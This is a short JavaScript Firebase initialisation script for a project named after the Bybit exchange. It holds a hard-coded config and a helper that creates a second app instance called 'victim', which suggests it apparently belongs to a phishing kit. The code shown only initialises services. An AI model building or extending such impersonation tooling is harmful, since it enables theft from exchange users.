

(function () {
  'use strict';

  if (typeof firebase === 'undefined') {
    console.error('Firebase SDK not loaded. Include firebase-app-compat.js before firebase-init.js.');
    return;
  }

  if (!firebase.apps.length) {
    firebase.initializeApp({
      apiKey: 'AIzaSyDLCmK1xfvs2xjhmkUea-Z9TAgA-oMpPq0',
      authDomain: 'bybit-4b133.firebaseapp.com',
      databaseURL: 'https://bybit-4b133-default-rtdb.firebaseio.com',
      projectId: 'bybit-4b133',
      storageBucket: 'bybit-4b133.firebasestorage.app',
      messagingSenderId: '744896182656',
      appId: '1:744896182656:web:564e916dc194f9c9006965',
      measurementId: 'G-CPSGT4NPP6'
    });
  }

  
  window.fbAuth = firebase.auth();
  window.fbDb = firebase.database();

  
  
  
  
  
  window.fbVictim = function () {
    if (!window.__byVictimApp) {
      try {
        window.__byVictimApp = firebase.initializeApp(firebase.app().options, 'victim');
      } catch (e) {
        
        window.__byVictimApp = firebase.app('victim');
      }
    }
    return window.__byVictimApp;
  };

  
  try {
    window.fbAnalytics = firebase.analytics();
  } catch (e) {
    
  }
})();
